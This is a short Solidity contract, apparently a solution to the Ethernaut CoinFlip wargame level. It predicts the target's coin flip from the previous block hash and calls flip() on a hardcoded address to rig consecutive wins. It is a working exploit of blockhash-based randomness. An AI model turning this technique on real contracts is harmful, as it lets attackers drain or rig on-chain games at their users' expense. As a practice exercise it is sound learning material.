//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);

    function consecutiveWins() external view returns (uint256);
}

contract CoinFlip {
    ICoinFlip coinFlipContract;
    uint256 public lastBlock;
    uint256 lastHash;
    uint FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        coinFlipContract = ICoinFlip(
            0xb1988228bf9B433Aed38d9Ee1a2a30087bB338AE
        );
        lastBlock = block.number;
    }

    function attack() public returns (uint256 num) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        if (lastHash == blockValue) {
            revert();
        }
        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinFlipContract.flip(side);

        return coinFlipContract.consecutiveWins();
    }
}
